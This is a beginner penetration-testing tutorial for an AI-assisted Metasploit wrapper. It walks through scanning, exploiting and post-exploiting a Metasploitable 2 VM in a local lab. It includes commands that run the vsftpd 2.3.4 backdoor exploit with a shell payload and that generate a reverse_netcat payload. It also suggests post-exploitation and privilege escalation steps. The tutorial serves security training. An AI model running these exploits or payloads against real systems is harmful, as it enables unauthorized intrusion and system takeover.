# Basic Penetration Testing Tutorial

A hands-on tutorial for beginners to learn penetration testing with Metasploit-AI.

## Learning Objectives

By the end of this tutorial, you will:
- Understand basic penetration testing methodology
- Perform network discovery and vulnerability scanning
- Use AI to analyze and prioritize vulnerabilities
- Execute safe exploitation techniques
- Generate professional penetration testing reports

## Prerequisites

- Metasploit-AI Framework installed and configured
- Basic understanding of networking concepts
- Virtual lab environment (recommended)
- Legal authorization for testing targets

## Lab Setup

### Option 1: Local Virtual Lab

```bash
# Download Metasploitable (intentionally vulnerable VM)
wget https://sourceforge.net/projects/metasploitable/files/Metasploitable2/metasploitable-linux-2.0.0.zip

# Set up VirtualBox network
# Host-only network: 192.168.56.0/24
# Attacker: 192.168.56.1 (your machine)
# Target: 192.168.56.101 (Metasploitable)
```

### Option 2: Cloud Lab Environment

```bash
# Use cloud platforms like TryHackMe, HackTheBox, or VulnHub
# Ensure you have proper authorization and follow platform rules
```

## Tutorial Steps

### Step 1: Environment Verification

First, let's verify our setup and connectivity:

```bash
# Start Metasploit-AI
python app.py --mode cli

# Check system status
msf-ai> status

# Verify target connectivity
msf-ai> ping 192.168.56.101
```

Expected output:
```
msf-ai> status
[✓] Framework initialized
[✓] Database connected
[✓] AI models loaded
[✓] Metasploit RPC connected
[✓] All systems operational
```

### Step 2: Network Discovery

Let's discover what's on our target network:

```bash
# Perform network discovery
msf-ai> scan 192.168.56.0/24 --type discovery

# View discovered hosts
msf-ai> targets list
```

**What's happening:**
- The framework scans the network to find active hosts
- Uses ping sweeps and ARP requests
- Identifies responsive IP addresses

**Expected results:**
```
Target ID | IP Address      | Status | OS Hint  | Last Seen
1         | 192.168.56.1    | Up     | Linux    | 2025-07-31 10:30:15
2         | 192.168.56.101  | Up     | Linux    | 2025-07-31 10:30:18
```

### Step 3: Service Enumeration

Now let's discover what services are running:

```bash
# Scan for services on discovered target
msf-ai> scan 192.168.56.101 --type services

# View detailed service information
msf-ai> targets info 192.168.56.101
```

**What's happening:**
- Performs port scans to identify open ports
- Attempts service version detection
- Gathers banner information

**Expected results:**
```
Port | Protocol | Service | Version              | State
21   | TCP      | FTP     | vsftpd 2.3.4        | Open
22   | TCP      | SSH     | OpenSSH 4.7p1       | Open
23   | TCP      | Telnet  | Linux telnetd        | Open
25   | TCP      | SMTP    | Postfix smtpd        | Open
53   | TCP      | DNS     | ISC BIND 9.4.2       | Open
80   | TCP      | HTTP    | Apache httpd 2.2.8   | Open
```

### Step 4: Vulnerability Scanning

Let's identify potential vulnerabilities:

```bash
# Perform vulnerability scan
msf-ai> scan 192.168.56.101 --type vuln

# View discovered vulnerabilities
msf-ai> show vulnerabilities --target 192.168.56.101
```

**What's happening:**
- Checks services against known vulnerability databases
- Identifies potential security weaknesses
- Maps CVE identifiers to discovered services

**Expected results:**
```
CVE ID         | Service      | Severity | Description
CVE-2011-2523  | vsftpd 2.3.4 | Critical | Backdoor command execution
CVE-2008-0166  | OpenSSH      | High     | Weak key generation
CVE-2009-2698  | Apache       | Medium   | Information disclosure
```

### Step 5: AI-Powered Analysis

Now let's use AI to analyze our findings:

```bash
# AI vulnerability analysis
msf-ai> ai analyze --target 192.168.56.101

# Get AI exploit recommendations
msf-ai> ai recommend --target 192.168.56.101 --severity critical
```

**What's happening:**
- AI analyzes vulnerability context and relationships
- Calculates risk scores based on environmental factors
- Recommends optimal exploitation paths

**Expected results:**
```
AI Analysis Results for 192.168.56.101:

Risk Score: 9.2/10 (Critical)

Top Recommendations:
1. vsftpd_234_backdoor (Success: 95%)
   - Targets: FTP service on port 21
   - Impact: Remote code execution
   - Difficulty: Low

2. ssh_weak_keys (Success: 80%)
   - Targets: SSH service on port 22
   - Impact: Authentication bypass
   - Difficulty: Medium
```

### Step 6: Safe Exploitation

Let's perform controlled exploitation:

```bash
# Use AI-recommended exploit
msf-ai> ai exploit --target 192.168.56.101 --exploit vsftpd_234_backdoor

# Alternatively, manual exploitation:
msf-ai> exploit vsftpd_234_backdoor --target 192.168.56.101 --payload cmd/unix/interact
```

**What's happening:**
- Executes the exploit against the target service
- Establishes a session if successful
- Provides command shell access

**Expected results:**
```
[+] Exploit successful!
[+] Session 1 created (192.168.56.101:6200 -> 192.168.56.1:35847)
[+] Command shell session opened
```

### Step 7: Post-Exploitation

Let's gather information from our compromised system:

```bash
# List active sessions
msf-ai> sessions list

# Interact with the session
msf-ai> sessions interact 1

# Basic system reconnaissance
id
uname -a
ps aux
ls /home
```

**What's happening:**
- We now have shell access to the target system
- Can gather system information and user data
- Explore the file system and running processes

**Expected results:**
```
uid=0(root) gid=0(root) groups=0(root)
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux

User directories found:
/home/msfadmin
/home/user
```

### Step 8: AI-Assisted Post-Exploitation

Use AI to guide post-exploitation activities:

```bash
# Background the session
background

# AI-powered information gathering
msf-ai> ai post-exploit --session 1 --gather-intel

# Look for privilege escalation opportunities
msf-ai> ai post-exploit --session 1 --privilege-escalation
```

**What's happening:**
- AI analyzes the compromised system
- Suggests relevant post-exploitation modules
- Identifies privilege escalation vectors

**Expected results:**
```
AI Post-Exploitation Analysis:

Information Gathering Suggestions:
- enum_system: Gather system information
- enum_users: Enumerate user accounts
- enum_network: Map network connections

Privilege Escalation Opportunities:
- linux_kernel_exploits: Kernel-level exploits
- sudo_weaknesses: Sudo configuration issues
```

### Step 9: Report Generation

Generate a professional penetration testing report:

```bash
# Generate comprehensive report
msf-ai> report generate --format html --template pentest --output tutorial_report.html

# Generate executive summary
msf-ai> report generate --format pdf --template executive --output executive_summary.pdf
```

**What's happening:**
- Framework compiles all findings into a professional report
- Includes vulnerability details, exploitation evidence, and recommendations
- Provides both technical and executive-level summaries

**Report Contents:**
- Executive Summary
- Methodology
- Findings and Vulnerabilities
- Exploitation Evidence
- Risk Assessment
- Remediation Recommendations

### Step 10: Cleanup and Documentation

Properly clean up and document your activities:

```bash
# Close sessions
msf-ai> sessions kill --all

# Clear sensitive data
msf-ai> db cleanup --confirm

# Export findings for future reference
msf-ai> report generate --format json --output findings.json
```

## Key Learning Points

### Penetration Testing Methodology

1. **Reconnaissance**: Gather information about targets
2. **Scanning**: Identify services and vulnerabilities
3. **Enumeration**: Detailed service analysis
4. **Exploitation**: Gain unauthorized access
5. **Post-Exploitation**: Maintain access and gather intelligence
6. **Reporting**: Document findings and recommendations

### AI Enhancement Benefits

- **Intelligent Prioritization**: AI helps focus on high-impact vulnerabilities
- **Success Prediction**: Estimates likelihood of exploit success
- **Automated Analysis**: Reduces manual analysis time
- **Context Awareness**: Considers environmental factors

### Security Best Practices

- **Authorization**: Always obtain written permission
- **Scope**: Stay within defined testing boundaries
- **Documentation**: Keep detailed logs of all activities
- **Cleanup**: Remove artifacts and close access points
- **Confidentiality**: Protect sensitive information discovered

## Common Issues and Solutions

### Exploit Failures

**Problem**: Exploit doesn't work as expected
```
[-] Exploit failed: target not vulnerable
```

**Solutions**:
```bash
# Verify target vulnerability
msf-ai> exploits check vsftpd_234_backdoor --target 192.168.56.101

# Try alternative exploits
msf-ai> ai recommend --target 192.168.56.101 --alternatives

# Check service version compatibility
msf-ai> targets info 192.168.56.101 --detailed
```

### Session Connectivity Issues

**Problem**: Can't establish or maintain sessions
```
[-] Session connection failed
```

**Solutions**:
```bash
# Check firewall settings
iptables -L

# Verify network connectivity
ping 192.168.56.101
telnet 192.168.56.101 6200

# Try different payload types
msf-ai> payload generate cmd/unix/reverse_netcat --lhost 192.168.56.1 --lport 4444
```

### Permission Issues

**Problem**: Insufficient privileges for operations
```
Error: Permission denied
```

**Solutions**:
```bash
# Run with appropriate privileges
sudo python app.py --mode cli

# Use alternative scan techniques
msf-ai> scan 192.168.56.101 --technique connect --no-ping

# Configure capabilities
sudo setcap cap_net_raw+ep /usr/bin/nmap
```

## Next Steps

After completing this tutorial:

1. **Practice More**: Set up additional vulnerable VMs
2. **Learn Advanced Techniques**: Try the [Advanced Exploitation Tutorial](advanced-exploitation.md)
3. **Study AI Features**: Read the [AI Analysis Tutorial](ai-analysis.md)
4. **Automation**: Learn [Custom Automation](automation.md)
5. **Real Scenarios**: Practice on authorized targets with permission

## Additional Resources

### Vulnerable Lab Environments

- **Metasploitable 2/3**: Intentionally vulnerable Linux VMs
- **DVWA**: Damn Vulnerable Web Application
- **VulnHub**: Collection of vulnerable VMs
- **TryHackMe**: Online penetration testing platform
- **HackTheBox**: Advanced penetration testing challenges

### Learning Materials

- **Books**: "Metasploit: The Penetration Tester's Guide"
- **Courses**: CEH, OSCP, PNPT certification paths
- **Documentation**: Official Metasploit documentation
- **Community**: Security forums and Discord servers

### Ethical Guidelines

- **NIST**: Cybersecurity Framework guidelines
- **OWASP**: Web application security standards
- **SANS**: Security training and certification
- **EC-Council**: Ethical hacking code of ethics

---

**⚠️ Security Notice**: This tutorial is for educational purposes only. Always obtain proper authorization before testing any systems. Use this knowledge responsibly and ethically.

---

*Created by [Yashab Alam](https://github.com/yashab-cyber) and the [ZehraSec](https://www.zehrasec.com) Team*
